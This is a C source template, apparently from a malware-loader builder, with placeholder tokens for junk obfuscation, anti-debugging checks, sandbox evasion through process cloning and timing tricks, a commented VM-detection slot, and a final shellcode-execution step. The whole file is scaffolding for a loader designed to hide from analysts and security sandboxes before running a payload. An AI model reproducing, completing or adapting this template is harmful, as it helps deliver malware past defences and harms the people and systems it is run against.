#include <stdio.h>

{{header}}

#define DBG_THREAD_SLEEP_INTERVAL           (1000 + {{value:byte}} + {{value:byte}})  // ~1s

// *** Caller instructions ***
// {{caller-init}}
//   -> Initializes the caller variable
// {{caller-var}}
//   -> Inserts the caller variable, use it to pass caller to the function as a parameter
// {{caller-ptr}}
//   -> Inserts the caller pointer, use it to pass caller to the function as a parameter
// {{caller-decl-var}}
//   -> Inserts the caller variable declaration, use it to declare a function parameter
// {{caller-decl-ptr}}
//   -> Inserts the caller pointer declaration, uses it to declare a function parameter
// {{caller-cast}}
//   -> Declares the caller pointer and initializes it by casting from another pointer,
//      use it in case of API callback functions with arguments of type void*
// *** ***

static DWORD WINAPI thread_proc(LPVOID lpParameter) {
    {{obf:*}}
    {{caller-cast}}lpParameter;

    {{obf:*}}
    while (1) {
        {{obf:*}} {{dbg:*}}
        {{obf:*}} {{dbg:*}}
        {{obf:*}} {{dbg:*}}
        {{obf:*}} {{dbg:*}}
        {{obf:*}} {{dbg:*}}
        {{obf:*}} {{dbg:*}}
        {{obf:*}} {{api-n:Sleep}}((PVOID)DBG_THREAD_SLEEP_INTERVAL);
        {{obf:*}}
    }

    {{obf:*}}
    return 0;
}

int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    {{obf:*}}
    {{obf:*}}
    {{obf:*}}
    {{caller-init}}
    {{obf:*}} {{dbg:*}}
    {{obf:*}} {{dbg:*}}
    {{obf:*}} {{dbg:*}}
    {{obf:*}} {{dbg:*}}
    {{obf:*}} {{dbg:*}}
    {{obf:*}} {{dbg:*}}
    {{obf:*}}

    if (!{{api-n:CreateThread}}(NULL, 0, thread_proc, {{caller-ptr}}, 0, NULL)) {
        {{obf:*}}
        return 0;
    }
    
    {{obf:*}} {{snd:clone}}
    {{obf:*}} {{snd:query_performance_counter,rdtsc}}
    {{obf:*}} {{snd:*}}
    {{obf:*}} {{snd:*}}
    {{obf:*}} {{snd:query_performance_counter,rdtsc}}

    // {{obf:*}} {{vmd:*}}
    
    {{obf:*}} {{shell-exec}}
    {{obf:*}}

    return 0;
}
